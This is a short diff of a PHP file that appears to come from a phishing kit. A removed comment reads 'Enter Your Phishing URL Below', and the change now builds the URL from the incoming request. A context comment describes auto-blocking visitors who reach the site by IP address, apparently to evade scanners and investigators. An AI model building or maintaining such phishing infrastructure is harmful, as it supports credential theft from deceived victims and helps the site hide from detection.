@@ -7,8 +7,7 @@ ob_end_clean();
 
 header("Access-Control-Allow-Origin: *");
 
-// Enter Your Phishing URL Below
-$url = $APIDomain;
+$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 
 // This part auto-blocks anyone accessing the site by IP only
 $parts = parse_url($url);
